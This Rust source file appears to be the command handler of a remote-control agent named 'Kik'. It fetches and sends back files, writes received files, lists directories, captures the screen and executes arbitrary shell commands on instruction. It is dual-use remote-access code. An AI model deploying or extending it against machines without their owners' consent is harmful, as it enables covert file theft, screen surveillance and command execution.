use crate::context::Context;
use crate::{cmd_util, screen};
use bytes::{BufMut, BytesMut};
use common::channel::Channel;
use common::command::{Command, CtrlCommand};
use common::message::frame::Frame;
use common::message::resp::Resp;
use common::protocol::BufSerializable;
use common::{file_util, protocol};
use log::debug;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Mutex;
use tokio::time::error::Elapsed;
use tokio::time::timeout;
use uuid::Uuid;

pub async fn run(context: &Context, cmd: Command) -> Resp {
    match cmd {
        Command::Ctrl(c) => {
            let mut info ;
            match c {
                CtrlCommand::GetFile(file_path, _) => match file_util::read_file(file_path).await {
                    Ok(v) => match context.find_and_send_data(&v).await {
                        Ok(data_id) => {
                            return Resp::DataId(data_id);
                        }
                        Err(e) => {
                            info = format!("Kik发送数据失败,err:{:?}", e);
                        }
                    },
                    Err(e) => {
                        info = format!("Kik读取文件失败:{}", e);
                    }
                },
                CtrlCommand::GetBigFile(file_path, _) => {
                    info = "暂不支持".to_string();
                    //return  Resp::dataid(dataids.join(",")+)
                }
                CtrlCommand::SetFile(data_id, save_path) => {
                    //recv data
                  match context.read_data(data_id).await {
                        Ok(data) => {
                            //save_path
                            info = match file_util::save_file(save_path.as_str(), &data).await {
                                Ok(_) => {
                                    format!("保存文件至Kik:{}成功", save_path)
                                }
                                Err(e) => {
                                    format!("文件至Kik:{}失败,err:{}", save_path, e)
                                }
                            };
                        }
                        Err(e) => {
                            info = format!("{}",e)
                        }
                    }

                }
                CtrlCommand::Ls(s) => {
                    println!("发现 ls");
                    let args: Vec<&str> = s.split_ascii_whitespace().collect();
                    match
                    (match args.as_slice() {
                        [path, arg, .. ] => {
                            if *arg == "-r" {
                                file_util::ls(*path, true)
                            } else {
                                file_util::ls(*path, false)
                            }
                        }
                        _ => {
                            file_util::ls(s.as_str(), false)
                        }
                    }).await {
                        Ok(v) => {
                            info = format_file_meta(&v);
                        }
                        Err(e) => {
                            info = e.to_string();
                        }
                    }
                }
                CtrlCommand::Screen(_) => match screen::cut_screen().await {
                    Ok(v) => match context.find_and_send_data(&v).await {
                        Ok(data_id) => {
                            return Resp::DataId(data_id);
                        }
                        Err(e) => {
                            info = format!("Kik发送数据失败,err:{:?}", e);
                        }
                    },
                    Err(e) => {
                        info = format!("Kik截屏失败,err:{:?}", e);
                    }
                },
            }
            Resp::Info(info)
        }
        Command::Exec(s) => {
            // let v: Vec<String> = s.trim().split_whitespace().map(|x| x.to_string()).collect();
            Resp::Info(match cmd_util::cmd_exec_line(s.as_str(), false, true).await {
                Ok(s) => {
                    s
                }
                Err(e) => {
                    format!("cmd exec err:{}", e)
                }
            })
        }
        _ => Resp::Info("暂不支持该类型消息".to_string()),
    }
}

fn format_file_meta(
    data: &Vec<(Option<String>, bool, Option<u64>, Option<String>, Option<String>)>,
) -> String {
    let mut res = String::new();
    let file_name_header = "Filename";
    let is_file_header = "IsFile";
    let size_header = "Size(KB)";
    let create_date_header = "Created Date";
    let modified_date_header = "Modified Date";
    // 用于存储每列的最大宽度
    let mut max_filename_len = file_name_header.len();
    let mut max_is_file_len = is_file_header.len();
    let mut max_size_len = size_header.len();
    let mut max_created_date_len = create_date_header.len();
    let mut max_modified_date_len = modified_date_header.len();

    let is_file_str = |is_file: bool| -> &str {
        if is_file {
            "File"
        } else {
            "Directory"
        }
    };
    // 首先，找出每列的最大宽度
    for (filename, is_file, size, created_date, modified_date) in data {
        if let Some(name) = filename {
            max_filename_len = max_filename_len.max(name.len());
        }
        let is_file_str = is_file_str(*is_file);
        max_is_file_len = max_is_file_len.max(is_file_str.len());

        let size_str = format!("{}", match size.map(|size| { size / 1024 }) {
            None => {
                "__".to_string()
            }
            Some(size) => {
                size.to_string()
            }
        });
        ; // 转换到KB
        max_size_len = max_size_len.max(size_str.len());

        if let Some(date) = created_date {
            max_created_date_len = max_created_date_len.max(date.len());
        }

        if let Some(date) = modified_date {
            max_modified_date_len = max_modified_date_len.max(date.len());
        }
    }

    // 打印表头
    res += &format!(
        "{:<width$} | {:<width2$} | {:<width3$} | {:<width4$} | {:<width5$}\n",
        file_name_header,
        is_file_header,
        size_header,
        create_date_header,
        modified_date_header,
        width = max_filename_len,
        width2 = max_is_file_len,
        width3 = max_size_len,
        width4 = max_created_date_len,
        width5 = max_modified_date_len,
    );

    // 打印分隔线
    res += &format!(
        "{}-+-{}-+-{}-+-{}-+-{}\n",
        "-".repeat(max_filename_len),
        "-".repeat(max_is_file_len),
        "-".repeat(max_size_len),
        "-".repeat(max_created_date_len),
        "-".repeat(max_modified_date_len),
    );

    // 打印数据
    let blank = "".to_string();
    for (filename, is_file, size, created_date, modified_date) in data {
        let filename_str = filename.as_ref().unwrap_or(&blank);
        let size_str = format!("{}", match size.map(|size| { size / 1024 }) {
            None => {
                "__".to_string()
            }
            Some(size) => {
                size.to_string()
            }
        }); // 转换到KB
        let created_date_str = created_date.as_ref().unwrap_or(&blank);
        let modified_date_str = modified_date.as_ref().unwrap_or(&blank);

        res += &format!(
            "{:<width$} | {:<width2$} | {:<width3$} | {:<width4$} | {:<width5$}\n",
            filename_str,
            is_file_str(*is_file),
            size_str,
            created_date_str,
            modified_date_str,
            width = max_filename_len,
            width2 = max_is_file_len,
            width3 = max_size_len,
            width4 = max_created_date_len,
            width5 = max_modified_date_len,
        );
    }
    res
}
